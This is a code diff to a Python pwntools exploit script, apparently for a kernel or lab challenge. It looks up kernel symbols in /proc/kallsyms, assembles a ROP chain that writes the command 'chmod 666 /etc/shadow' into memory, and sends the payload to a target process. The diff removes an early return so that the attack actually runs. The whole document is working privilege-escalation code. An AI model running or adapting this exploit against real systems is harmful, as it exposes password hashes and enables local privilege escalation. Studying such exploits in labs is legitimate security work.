@@ -72,8 +72,9 @@ class Adjuster(object):
 
 def kallsyms_lookup_name(sym_name):
     with open('/proc/kallsyms', 'rb') as i:
-        return int([l.split()[0] for l in i.read().decode('utf-8').split('\n')
-                if sym_name == l.split()[-1]][0], 16)
+        for l in i.read().decode('utf-8').split('\n'):
+            if sym_name == l.split()[-1]:
+                return int(l.split()[0], 16)
 
 def leaked(start_leaker, search_for):
     # Get the address from the leak
@@ -130,13 +131,21 @@ def build(leak, gadget_file, sled_length, adjuster):
 
     # rop = write4(rop, gadget_file, adjuster, string_location, b'/tmp')
     rop = write4(rop, gadget_file, adjuster, string_location + 0,
-            b'/bin/bas')
+            b'/bin')
+    rop = write4(rop, gadget_file, adjuster, string_location + 4,
+            b'/bas')
     rop = write4(rop, gadget_file, adjuster, string_location + 8,
-            b'h\x00-c\x00chm')
+            b'h\x00-c')
+    rop = write4(rop, gadget_file, adjuster, string_location + 12,
+            b'\x00chm')
     rop = write4(rop, gadget_file, adjuster, string_location + 16,
-            b'od 666 /')
+            b'od 6')
+    rop = write4(rop, gadget_file, adjuster, string_location + 20,
+            b'66 /')
     rop = write4(rop, gadget_file, adjuster, string_location + 24,
-            b'etc/shad')
+            b'etc/')
+    rop = write4(rop, gadget_file, adjuster, string_location + 28,
+            b'shad')
     rop = write4(rop, gadget_file, adjuster, string_location + 32,
             b'ow\x00')
 
@@ -202,12 +211,13 @@ def attack_kernel(target_binary, payload_file, sled_length):
     exploit = create_exploit(target_binary, payload_file, sled_length, leak, Adjuster(0x0))
     args = ['./query_app']
     print(args)
-    return
     p = process(args)
     print('sending payload...')
     p.send(exploit)
-    leaker.shutdown('send')
+    p.shutdown('send')
     print('payload sent')
+    print(p.recvall())
+    p.shutdown()
 
 def main():
     # Set the pwntools context
